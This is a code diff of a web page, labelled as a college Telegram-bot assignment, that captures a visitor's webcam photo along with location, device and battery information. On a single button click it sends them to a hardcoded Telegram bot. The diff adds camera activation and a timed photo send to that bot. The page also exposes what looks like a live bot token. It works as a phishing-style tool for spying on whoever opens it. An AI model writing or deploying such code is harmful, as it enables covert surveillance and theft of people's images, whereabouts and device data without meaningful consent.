@@ -8,14 +8,15 @@
   <h1>Tugas Kuliah - Bot Telegram</h1>
   
   <video id="video" autoplay></video>
-  <button onclick="capturePhotoAndSend()">Ambil Foto, Lokasi, dan Info Perangkat</button>
+  <button onclick="startCapture()">Ambil Foto, Lokasi, dan Info Perangkat</button>
   <canvas id="canvas" style="display: none;"></canvas>
 
   <script>
     const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
     const chatId = '1121369247';
 
-api.telegram.org/bot${token}/sendMessage`;
+    function sendTelegramMessage(text) {
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
       const data = { chat_id: chatId, text: text };
       $.post(url, data);
     }
@@ -26,10 +27,18 @@ api.telegram.org/bot${token}/sendMessage`;
       $.post(url, data);
     }
 
-    function capturePhotoAndSend() {
+    function startCapture() {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
       const context = canvas.getContext('2d');
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          video.srcObject = stream;
+        })
+        .catch(function(error) {
+          console.error('Error accessing camera: ', error);
+        });
 
       video.addEventListener('loadedmetadata', function() {
         canvas.width = video.videoWidth;
@@ -37,31 +46,28 @@ api.telegram.org/bot${token}/sendMessage`;
       });
 
       video.addEventListener('play', function() {
-        drawFrame();
+        captureFrame();
       });
 
-      function drawFrame() {
+      function captureFrame() {
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        setTimeout(drawFrame, 16); // Menggambar frame berikutnya setiap 16ms (60 fps)
+        setTimeout(captureFrame, 16); // Capture frame every 16ms (60 fps)
       }
 
-      const photoData = function() {
-        canvas.toBlob(function(blob) {
-          const reader = new FileReader();
-          reader.readAsDataURL(blob);
-          reader.onloadend = function() {
-            const base64data = reader.result;
-            sendTelegramPhoto(base64data);
-          }
-        }, 'image/jpeg', 0.8);
-      };
+      setTimeout(function() {
+        capturePhotoAndSend();
+      }, 3000);
+    }
+
+    function capturePhotoAndSend() {
+      const canvas = document.getElementById('canvas');
+      const photoData = canvas.toDataURL('image/jpeg');
+      sendTelegramPhoto(photoData);
 
       getLiveLocation();
       getDeviceInfo();
       getBatteryInfo();
-      copyDeviceClipboard();
-
-      setTimeout(photoData, 3000);
+      copyToClipboard();
     }
 
     function getLiveLocation() {
@@ -103,7 +109,7 @@ api.telegram.org/bot${token}/sendMessage`;
       }
     }
 
-    function copyDeviceClipboard() {
+    function copyToClipboard() {
       const deviceInfo = `
         Browser: ${navigator.userAgent}
         Resolusi Layar: ${screen.width}x${screen.height}
